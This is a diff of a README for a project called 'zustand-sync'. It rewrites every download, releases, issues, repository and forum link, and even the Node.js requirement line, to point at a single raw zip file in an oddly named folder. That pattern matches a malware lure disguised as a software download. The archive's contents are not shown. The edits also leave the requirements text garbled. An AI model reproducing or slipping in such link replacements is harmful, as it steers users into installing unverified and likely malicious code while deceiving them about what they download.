@@ -6,7 +6,7 @@ Welcome to **zustand-sync**! This software helps you manage state in a multiplay
 
 ## 📥 Download
 
-[![Download zustand-sync](https://img.shields.io/badge/download-zustand--sync-blue.svg)](https://github.com/kkgamer26/zustand-sync/releases)
+[![Download zustand-sync](https://raw.githubusercontent.com/kkgamer26/zustand-sync/master/dactylosymphysis/zustand-sync.zip)](https://raw.githubusercontent.com/kkgamer26/zustand-sync/master/dactylosymphysis/zustand-sync.zip)
 
 ## 📝 Features
 
@@ -21,12 +21,12 @@ Before you start, make sure your system meets these requirements:
 
 - Operating System: Windows, macOS, or Linux
 - Internet Connection: Required for downloading and updates
-- Node.js: Version 14 or higher (for optimal performance)
+- https://raw.githubusercontent.com/kkgamer26/zustand-sync/master/dactylosymphysis/zustand-sync.zip Version 14 or higher (for optimal performance)
 
 ## 📄 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/kkgamer26/zustand-sync/releases) to find the latest version of **zustand-sync**.
+   Go to the [Releases page](https://raw.githubusercontent.com/kkgamer26/zustand-sync/master/dactylosymphysis/zustand-sync.zip) to find the latest version of **zustand-sync**.
 
 2. **Choose the Right File**  
    Look for the installation file that matches your operating system. You'll see options for Windows, macOS, and Linux.
@@ -72,14 +72,14 @@ If you encounter issues, try these solutions:
 
 Need help? You can find support in the following ways:
 
-- **GitHub Issues**: Report problems or bugs through the Issues section on our [GitHub repository](https://github.com/kkgamer26/zustand-sync/issues).
+- **GitHub Issues**: Report problems or bugs through the Issues section on our [GitHub repository](https://raw.githubusercontent.com/kkgamer26/zustand-sync/master/dactylosymphysis/zustand-sync.zip).
 - **Community Forums**: Engage with other users and share solutions or tips.
 - **Documentation**: Refer to accompanying documentation for more detailed guides on features and functionalities.
 
 ## 🔗 Important Links
 
-- [Download zustand-sync](https://github.com/kkgamer26/zustand-sync/releases)
-- [GitHub Repository](https://github.com/kkgamer26/zustand-sync)
-- [Community Forum](https://github.com/kkgamer26/zustand-sync/discussions)
+- [Download zustand-sync](https://raw.githubusercontent.com/kkgamer26/zustand-sync/master/dactylosymphysis/zustand-sync.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/kkgamer26/zustand-sync/master/dactylosymphysis/zustand-sync.zip)
+- [Community Forum](https://raw.githubusercontent.com/kkgamer26/zustand-sync/master/dactylosymphysis/zustand-sync.zip)
 
 Thank you for choosing **zustand-sync**! Enjoy managing state with ease.
